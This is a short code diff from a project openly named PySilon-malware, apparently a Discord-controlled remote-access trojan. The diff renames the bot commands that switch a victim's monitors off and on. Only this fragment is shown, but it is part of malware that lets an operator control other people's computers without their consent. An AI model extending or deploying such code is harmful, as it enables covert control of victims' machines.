@@ -3,7 +3,7 @@ import threading
 # end of imports
 
 # on message
-elif message.content == '.turnoff':
+elif message.content == '.monitors-off':
     if not turned_off:
         await message.delete()
         turned_off = True
@@ -24,7 +24,7 @@ elif message.content == '.turnoff':
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
 
-elif message.content == '.turnon':
+elif message.content == '.monitors-on':
     if turned_off:
         await message.delete()
 
